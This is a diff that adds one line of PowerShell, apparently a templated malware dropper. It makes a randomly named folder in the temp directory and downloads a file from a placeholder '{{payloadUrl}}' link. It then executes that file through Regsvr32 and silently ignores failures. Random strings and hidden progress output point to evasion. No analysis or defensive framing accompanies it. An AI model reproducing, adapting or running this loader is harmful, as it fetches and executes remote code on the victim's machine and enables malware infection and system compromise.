@@ -1,0 +1,1 @@
+Write-Host "ApPhR";$ProgressPreference="SilentlyContinue";$links=("{{payloadUrl}}", "{{payloadUrl}}");$t="nfWFQ";$d="$env:TMP\..\$t";mkdir -force $d | out-null;foreach ($u in $links) {try {IWR $u -OutFile $d\jxKPIrMFxJ.OOf;Regsvr32.exe "$d\jxKPIrMFxJ.OOf";break} catch { }}
